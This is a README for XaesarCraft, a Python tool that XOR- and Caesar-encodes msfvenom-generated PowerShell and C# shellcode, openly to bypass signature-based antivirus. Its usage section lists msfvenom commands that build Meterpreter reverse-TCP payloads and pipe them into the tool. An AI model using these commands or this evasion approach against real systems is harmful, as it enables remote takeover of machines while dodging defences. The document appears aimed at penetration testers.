# XaesarCraft

XaesarCraft is a powerful security tool that integrates XOR encryption and Caesar cipher capabilities, offering users a unique opportunity to manipulate and obscure payloads for PowerShell (PS1) and C# scripts generated through MSFVenom.

## Disclaimer

This tool is for educational purposes only. Unauthorized use of this tool against systems you do not own or have permission to test is illegal and unethical. The creator and contributors of XaesarCraft are not responsible for any misuse or damage caused by this program.

## Key Features:

1. **XOR Encryption**: XaesarCraft enables users to employ XOR encryption to obfuscate payloads. This is particularly useful for bypassing signature-based antivirus systems.

2. **Caesar Cipher**: Add an additional layer of encryption by applying the Caesar cipher to your payloads.

3. **Integration with MSFVenom**: Generate payloads using MSFVenom directly from within XaesarCraft, and then apply XOR and Caesar ciphers for encryption.

4. **Customization of Keys**: Specify your own keys for XOR encryption and select a shift for the Caesar cipher, creating unique and complex combinations.

## Example of usage:

```
More usefull ;)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f csharp | python3 XaesarCraft.py --mode rot # default ROT13
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f ps1 | python3 XaesarCraft.py --m rot -n 0x13
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f ps1 | python3 XaesarCraft.py # default XOR 0xfa
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f csharp | python3 XaesarCraft.py -n 0x13
Why not:
python3 XaesarCraft.py --input "[Byte[]] $buf = 0xf8,0xa5,0x6c,0x11,0xfc,0x05"
python3 XaesarCraft.py --input "[Byte[]] $buf = 0xf8,0xa5,0x6c,0x11,0xfc,0x05" -m rot
```

TBD:

 **Export**: Export encrypted payloads in various formats, including Base64, HEX, and bin.


## Target Audience

Designed for security researchers, penetration testers, and cybersecurity specialists, XaesarCraft offers comprehensive solutions for effectively creating and obscuring payloads, ensuring high levels of anonymity and protection.
